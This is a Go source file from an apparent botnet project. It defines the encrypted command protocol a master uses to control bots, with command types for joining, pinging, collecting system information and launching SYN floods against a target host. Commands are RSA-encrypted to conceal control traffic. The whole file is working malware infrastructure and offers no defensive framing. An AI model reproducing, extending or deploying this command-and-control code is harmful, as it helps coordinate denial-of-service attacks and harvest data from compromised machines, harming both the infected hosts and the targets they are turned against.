package protocol

import (
	"crypto/rsa"
	"encoding/json"
	"fmt"

	"github.com/adrianosela/botnet/lib/encryption"
)

// Command is a master-to-slave instruction
type Command struct {
	ReqID  string      `json:"id"`
	Type   CommandType `json:"type"`
	Args   CommandArgs `json:"args"`
	Target string      `json:"target"`
	When   int64       `json:"runat"`
}

// CommandArgs is an abstraction for command arguments
type CommandArgs map[string]string

// CommandType corresponds to a desired action being requested from slaves
type CommandType string

var (
	// CommandTypeAccepted is the response to a successful botnet join attempt
	// from a slave
	CommandTypeAccepted = CommandType("ACCEPTED")
	// CommandTypePing requests a PONG from bots, allowing calculations of latency
	CommandTypePing = CommandType("PING")
	// CommandTypeSysInfo requests system information from bots
	CommandTypeSysInfo = CommandType("SYS_INFO")
	// CommandTypeSynflood requests a bot to flood a host with SYN packets
	CommandTypeSynflood = CommandType("SYN_FLOOD")
	/*
	 * add command types here
	 */
)

// Encrypt converts a command to JSON and then encrypts it, returning the bytes
func (c *Command) Encrypt(pub *rsa.PublicKey) ([]byte, error) {
	cmdJSON, err := json.Marshal(c)
	if err != nil {
		return nil, fmt.Errorf("could not marshal message: %s", err)
	}
	cmdEncr, err := encryption.EncryptMessage(cmdJSON, pub)
	if err != nil {
		return nil, fmt.Errorf("could not encrypt message: %s", err)
	}
	return cmdEncr, nil
}

// DecryptCommand decrypts an encrypted command with the bot private key
func DecryptCommand(c []byte, priv *rsa.PrivateKey) (*Command, error) {
	cmdJSON, err := encryption.DecryptMessage(c, priv)
	if err != nil {
		return nil, fmt.Errorf("could not decrypt command: %s", err)
	}
	var cmd Command
	if err = json.Unmarshal(cmdJSON, &cmd); err != nil {
		return nil, fmt.Errorf("could not unmarshal command: %s", err)
	}
	return &cmd, nil
}
